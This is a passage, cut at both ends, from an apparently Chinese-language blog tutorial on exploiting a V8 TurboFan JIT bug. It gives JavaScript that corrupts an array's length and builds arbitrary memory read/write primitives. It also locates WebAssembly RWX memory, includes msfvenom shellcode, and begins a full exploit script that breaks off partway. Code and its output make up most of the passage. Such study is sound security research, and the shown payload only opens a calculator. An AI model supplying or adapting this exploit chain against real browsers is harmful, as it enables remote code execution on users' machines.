class="function"></span>&#123;</span><br><span class="line">    bigIntArray[<span class="number">0</span>] = BigInt(int);</span><br><span class="line">    <span class="keyword">return</span> floatArray[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Float64ToInt64</span>(<span class="params">float</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = float;</span><br><span class="line">    <span class="keyword">return</span> bigIntArray[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 修改JSArray length 的操作 -- *******/</span></span><br><span class="line"><span class="keyword">var</span> oob_arr = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_arr = [<span class="number">1.0</span>, <span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= <span class="number">9007199254740990</span>;</span><br><span class="line">    t *= <span class="number">2</span>;</span><br><span class="line">    t += <span class="number">2</span>;</span><br><span class="line">    oob_arr[t] = <span class="number">2.1729236899484389e-311</span>; <span class="comment">// 1024.f2smi</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 试着触发 turboFan，从而修改 JSArray 的 length</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    opt_me(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 简单 checker</span></span><br><span class="line"><span class="keyword">if</span>(oob_arr[<span class="number">1023</span>] == <span class="literal">undefined</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"OOB Fail!"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    log(<span class="string">"[+] oob_arr.length == "</span> + oob_arr.length);</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 任意地址读写原语 -- *******/</span></span><br><span class="line"><span class="keyword">var</span> array_buffer;</span><br><span class="line">array_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x233</span>);</span><br><span class="line">data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(array_buffer);</span><br><span class="line">backing_store_offset = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 确定backing_store_offset</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="comment">// smi(0x233) == 0x0000023300000000</span></span><br><span class="line">    <span class="keyword">if</span>(Float64ToInt64(oob_arr[i]) == <span class="number">0x0000023300000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        backing_store_offset = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 简单确认一下是否成功找到 backing_store</span></span><br><span class="line"><span class="keyword">if</span>(backing_store_offset == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"backing_store is not found!"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    log(<span class="string">"[+] backing_store offset: "</span> + backing_store_offset);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_8bytes</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_arr[backing_store_offset] = Int64ToFloat64(addr);</span><br><span class="line">    <span class="keyword">return</span> data_view.getBigInt64(<span class="number">0</span>, <span class="literal">true</span>); <span class="comment">// true 设置小端序</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_8bytes</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_arr[backing_store_offset] = Int64ToFloat64(addr);</span><br><span class="line">    data_view.setBigInt64(<span class="number">0</span>, BigInt(data), <span class="literal">true</span>); <span class="comment">// true 设置小端序</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- try arbitrary read/write -- *******/</span></span><br><span class="line"><span class="comment">// 试着读取地址为 0xdeaddead 的内存</span></span><br><span class="line">read_8bytes(<span class="number">0xdeaddead</span>);</span><br><span class="line"><span class="comment">// 试着写入地址为 0xdeaddead 的内存</span></span><br><span class="line">write_8bytes(<span class="number">0xdeaddead</span>, <span class="number">0x89abcdef</span>);</span><br></pre></td></tr></table></figure>
<p>测试结果如下：</p>
<blockquote>
<p>注：单次只能测试任意读或任意写，不能同时测试。</p>
</blockquote>
<ul>
<li>
<p>可以将目标数据写入目标地址：</p>
<p><img src="/2021/01/v8-turboFan/debugprint12.png" alt="img"></p>
</li>
<li>
<p>可以从目标地址中读出数据</p>
<p><img src="/2021/01/v8-turboFan/debugprint13.png" alt="img"></p>
</li>
</ul>
</li>
</ul>
<h4 id="c-泄露-RWX-地址">c. 泄露 RWX 地址</h4>
<ul>
<li>
<p>由于 v8 已经<a href="https://source.chromium.org/chromium/v8/v8.git/+/dde25872f58951bb0148cf43d6a504ab2f280485:src/flag-definitions.h;l=717" target="_blank" rel="noopener">取消</a>将 <strong>JIT 编码的 JSFunction</strong> 放入 RWX 内存中 ，因此我们必须另找它法。根据所搜索到的利用方式，有以下两种：</p>
<ol>
<li>
<p>将 Array 的 JSFunction 写入内存并泄露，之后就可以进一步泄露 JSFunction 中的 code 指针。由于这个Code指针指向 chromium 二进制文件内部，因此我们可以将二进制文件拖入 IDA 中计算相对位移，获取 <strong>代码基地址 =&gt; GOT表条目 =&gt; libc基地址 =&gt; enviroment指针</strong>，这样就可以获取到可写的栈地址以及<code>mprotect</code>地址。</p>
<p>然后将 shellcode 写入栈里并 ROP 调用 mprotect 修改执行权限，最后跳转执行，这样就可以成功执行 shellcode。</p>
<blockquote>
<p>此方法来自 Sakura 师傅，第四条参考链接。</p>
</blockquote>
</li>
<li>
<p>v8 除了编译 JS 以外还编译 WebAssembly （wasm）代码，而 wasm 模块至今仍然<a href="https://source.chromium.org/chromium/chromium/src/+/1bc5adc2c0e057fb0fb91afa0c534dada924f90e:v8/src/flags/flag-definitions.h;l=790" target="_blank" rel="noopener">使用</a> RWX 内存，因此我们可以试着将 shellcode 写入这块内存中并执行，不过这个方法有点折腾。</p>
<blockquote>
<p>此方法来自 doar-e，第一条参考链接。</p>
</blockquote>
</li>
</ol>
<p>第一种利用方式非常的直接，利用起来应该没有太大的难度。因此出于学习的目的，我们选择第二种方式，学习一下 WebAssembly 的利用方式。</p>
</li>
<li>
<p>通过查阅这片文章 <a href="https://www.anquanke.com/post/id/150923" target="_blank" rel="noopener">浅谈如何逆向分析WebAssembly二进制文件 - 安全客</a>，我们可以获取到wasm的简易使用方式，并通过这个方式获取到 Wasm 的 JSFunction：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// C++ 代码 `void func() &#123;&#125;` 的 wasm 二进制代码</span></span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">136</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasmCode),&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> WasmJSFunction = m.exports.func;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>而对于一个 Wasm 的 JSFunction，我们可以通过以下路径来获取 RWX 段地址：</p>
<blockquote>
<p>这条路径稍微有点长：JSFunction  -&gt; SharedFunctionInfo -&gt; WasmExportedFunctionData -&gt; WasmInstanceObject -&gt; JumpTableStart。</p>
</blockquote>
<ul>
<li>
<p>从 JSFunction 出发，获取其 SharedFunctionInfo（相对偏移为 0x18）</p>
<p><img src="/2021/01/v8-turboFan/debugprint6.png" alt="img"></p>
</li>
<li>
<p>之后从 SharedFunctionInfo 获取其 WasmExportedFunctionData（相对偏移为 0x8）</p>
<p><img src="/2021/01/v8-turboFan/debugprint7.png" alt="img"></p>
</li>
<li>
<p>再从 WasmExportedFunctionData 中获取 WasmInstanceObject（相对偏移为 0x10）</p>
<p><img src="/2021/01/v8-turboFan/debugprint8.png" alt="img"></p>
</li>
<li>
<p>最后从 WasmInstanceObject 中获取 JumpTableStart（相对偏移为 0xe8）</p>
<p><img src="/2021/01/v8-turboFan/debugprint9.png" alt="img"></p>
</li>
</ul>
</li>
<li>
<p>查看获取到的 JumpTableStart 位置处的数据，我们可以发现这里是一串汇编代码。给该位置下断，并在 JS 中执行一下 Wasm 的 JSFunction ，我们可以发现控制流被断点成功捕获：</p>
<p><img src="/2021/01/v8-turboFan/debugprint10.png" alt="img"></p>
<p>以下是测试用的 JS 代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// C++ 代码 `void func() &#123;&#125;` 的 wasm 二进制代码</span></span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,</span><br><span class="line">    <span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">136</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasmCode),&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> WasmJSFunction = m.exports.func;</span><br><span class="line"><span class="comment">// 输出一下 Wasm JSFunction 地址，并获取其 JumpTableStart</span></span><br><span class="line">%DebugPrint(WasmJSFunction);</span><br><span class="line"><span class="comment">// 之后在 gdb 中给 JumpTableStart 下个断点</span></span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="comment">// 尝试执行 Wasm JSFunction</span></span><br><span class="line">WasmJSFunction();</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>现在情况已经非常明了了，通过之前构建的任意地址读取原语，一步步读取 Wasm JSFunction 的各个属性并最终获取 RWX 内存地址：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prettyHex</span>(<span class="params">bigint</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"0x"</span> + BigInt.asUintN(<span class="number">64</span>,bigint).toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">'0'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C++ 代码 `void func() &#123;&#125;` 的 wasm 二进制代码</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,</span><br><span class="line">    <span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">136</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasmCode),&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> WasmJSFunction = m.exports.func;</span><br><span class="line"><span class="comment">// 将WasmJSFunction 布置到与 oob_arr 数组相同的内存段上</span></span><br><span class="line"><span class="comment">// 这里写入了一个哨兵值0x233333，用于查找 WasmJSFunction 地址</span></span><br><span class="line"><span class="keyword">var</span> WasmJSFunctionObj = &#123;<span class="attr">guard</span>: Int64ToFloat64(<span class="number">0x233333</span>), <span class="attr">wasmAddr</span>: WasmJSFunction&#125;;</span><br><span class="line"><span class="keyword">var</span> WasmJSFunctionIndex = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x4000</span>; i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="comment">// 查找哨兵值</span></span><br><span class="line">    <span class="keyword">if</span>(Float64ToInt64(oob_arr[i]) == <span class="number">0x233333</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        WasmJSFunctionIndex = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单确认一下是否成功找到 WasmJSFunctionAddr</span></span><br><span class="line"><span class="keyword">if</span>(WasmJSFunctionIndex == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"WasmJSFunctionAddr is not found!"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    log(<span class="string">"[+] find WasmJSFunctionAddr offset: "</span> + WasmJSFunctionIndex);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 WasmJSFunction 地址</span></span><br><span class="line">WasmJSFunctionAddr = Float64ToInt64(oob_arr[WasmJSFunctionIndex]) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find WasmJSFunction address: "</span> + prettyHex(WasmJSFunctionAddr));</span><br><span class="line"><span class="comment">// 获取 SharedFunctionInfo 地址</span></span><br><span class="line">SharedFunctionInfoAddr = read_8bytes(WasmJSFunctionAddr + BigInt(<span class="number">0x18</span>)) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find SharedFunctionInfoAddr address: "</span> + prettyHex(SharedFunctionInfoAddr));</span><br><span class="line"><span class="comment">// 获取 WasmExportedFunctionData 地址</span></span><br><span class="line">WasmExportedFunctionDataAddr = read_8bytes(SharedFunctionInfoAddr + BigInt(<span class="number">0x8</span>)) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find WasmExportedFunctionDataAddr address: "</span> + prettyHex(WasmExportedFunctionDataAddr));</span><br><span class="line"><span class="comment">// 获取 WasmInstanceObject 地址</span></span><br><span class="line">WasmInstanceObjectAddr = read_8bytes(WasmExportedFunctionDataAddr + BigInt(<span class="number">0x10</span>)) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find WasmInstanceObjectAddr address: "</span> + prettyHex(WasmInstanceObjectAddr));</span><br><span class="line"><span class="comment">// 获取 JumpTableStart 地址</span></span><br><span class="line">JumpTableStartAddr = read_8bytes(WasmInstanceObjectAddr + BigInt(<span class="number">0xe8</span>));</span><br><span class="line">log(<span class="string">"[+] find JumpTableStartAddr address: "</span> + prettyHex(JumpTableStartAddr));</span><br></pre></td></tr></table></figure>
<p>需要注意的是，在读取<code>WasmExportedFunctionDataAddr</code>时会触发 debug 的越界检查：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v8/src/code-stub-assembler.cc</span></span><br><span class="line"><span class="comment">// in CodeStubAssembler::FixedArrayBoundsCheck</span></span><br><span class="line">CSA_CHECK(<span class="keyword">this</span>, UintPtrLessThan(effective_index,</span><br><span class="line">                                  LoadAndUntagFixedArrayBaseLength(<span class="built_in">array</span>)));</span><br></pre></td></tr></table></figure>
<p>注释掉再重新编译即可。</p>
</li>
</ul>
<h4 id="d-shellcode">d. shellcode</h4>
<p>最后我们只要将 shellcode 写入该 RWX 地址处并调用 Wasm JSFunction 即可成功执行 shellcode。</p>
<p>使用 msfvenom 生成满足以下条件的 shellcode:</p>
<ul>
<li>
<p>payload为 <code>linux x64</code></p>
</li>
<li>
<p>格式为 C语言</p>
</li>
<li>
<p>命令为<code>DISPLAY=:0 gnome-calculator</code></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/<span class="built_in">exec</span> CMD=<span class="string">'DISPLAY=:0 gnome-calculator'</span> -f c</span><br></pre></td></tr></table></figure>
<p>输出如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Payload size: <span class="number">67</span> bytes</span><br><span class="line">Final size of c file: <span class="number">307</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"</span></span><br><span class="line"><span class="string">"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x1c\x00"</span></span><br><span class="line"><span class="string">"\x00\x00\x44\x49\x53\x50\x4c\x41\x59\x3d\x3a\x30\x20\x67\x6e"</span></span><br><span class="line"><span class="string">"\x6f\x6d\x65\x2d\x63\x61\x6c\x63\x75\x6c\x61\x74\x6f\x72\x00"</span></span><br><span class="line"><span class="string">"\x56\x57\x48\x89\xe6\x0f\x05"</span>;</span><br></pre></td></tr></table></figure>
<h4 id="e-exploit">e. exploit</h4>
<ul>
<li>
<p>结合上面的内容，release 版本 v8 的 exp 如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">msg</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(msg);</span><br><span class="line">    <span class="comment">// var elem = document.getElementById("#log");</span></span><br><span class="line">    <span class="comment">// elem.innerText += '[+] ' + msg + '\n';</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 64位整数 与 64位浮点数相互转换的原语 -- *******/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> transformBuffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> bigIntArray = <span class="keyword">new</span> BigInt64Array(transformBuffer);</span><br><span class="line"><span class="keyword">var</span> floatArray = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(transformBuffer);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Int64ToFloat64</span>(<span class="params">int</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigIntArray[<span class="number">0</span>] = BigInt(int);</span><br><span class="line">    <span class="keyword">return</span> floatArray[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Float64ToInt64</span>(<span class="params">float</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = float;</span><br><span class="line">    <span class="keyword">return</span> bigIntArray[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 修改JSArray length 的操作 -- *******/</span></span><br><span class="line"><span class="keyword">var</span> oob_arr = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_arr = [<span class="number">1.0</span>, <span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= <span class="number">9007199254740990</span>;</span><br><span class="line">    t *= <span class="number">2</span>;</span><br><span class="line">    t += <span class="number">2</span>;</span><br><span class="line">    oob_arr[t] = <span class="number">3.4766779039175022e-310</span>; <span class="comment">// 0x4000.f2smi</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 试着触发 turboFan，从而修改 JSArray 的 length</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    opt_me(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 简单 checker</span></span><br><span class="line"><span class="keyword">if</span>(oob_arr[<span class="number">1023</span>] == <span class="literal">undefined</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"OOB Fail!"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    log(<span class="string">"[+] oob_arr.length == "</span> + oob_arr.length);</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 任意地址读写原语 -- *******/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> array_buffer;</span><br><span class="line">array_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x233</span>);</span><br><span class="line">data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(array_buffer);</span><br><span class="line">backing_store_offset = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 确定backing_store_offset</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x4000</span>; i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="comment">// smi(0x400) == 0x0000023300000000</span></span><br><span class="line">    <span class="keyword">if</span>(Float64ToInt64(oob_arr[i]) == <span class="number">0x0000023300000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        backing_store_offset = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 简单确认一下是否成功找到 backing_store</span></span><br><span class="line"><span class="keyword">if</span>(backing_store_offset == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"backing_store is not found!"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    log(<span class="string">"[+] find backing_store offset: "</span> + backing_store_offset);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_8bytes</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_arr[backing_store_offset] = Int64ToFloat64(addr);</span><br><span class="line">    <span class="keyword">return</span> data_view.getBigInt64(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_8bytes</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_arr[backing_store_offset] = Int64ToFloat64(addr);</span><br><span class="line">    data_view.setBigInt64(<span class="number">0</span>, BigInt(data), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 布置 wasm 地址以及获取 RWX 内存地址 -- *******/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prettyHex</span>(<span class="params">bigint</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"0x"</span> + BigInt.asUintN(<span class="number">64</span>,bigint).toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">'0'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C++ 代码 `void func() &#123;&#125;` 的 wasm 二进制代码</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span 